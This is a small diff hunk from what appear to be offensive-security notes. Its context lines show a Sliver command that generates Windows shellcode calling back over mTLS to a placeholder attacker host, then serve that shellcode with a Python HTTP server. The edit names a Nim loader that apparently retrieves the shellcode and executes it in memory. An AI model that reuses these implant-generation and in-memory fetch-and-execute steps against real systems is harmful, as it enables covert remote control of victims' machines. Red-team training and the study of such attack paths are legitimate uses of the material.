@@ -1463,7 +1463,7 @@ sliver > generate --mtls attacker_ip --save /tmp -f shellcode --os windows
 
 python3 -m http.server 80 --directory /tmp
 ```
-- run r
+- run `retrvSHellcodeExecMemory.nim`
 
 
 # 25	ATTACK PATH
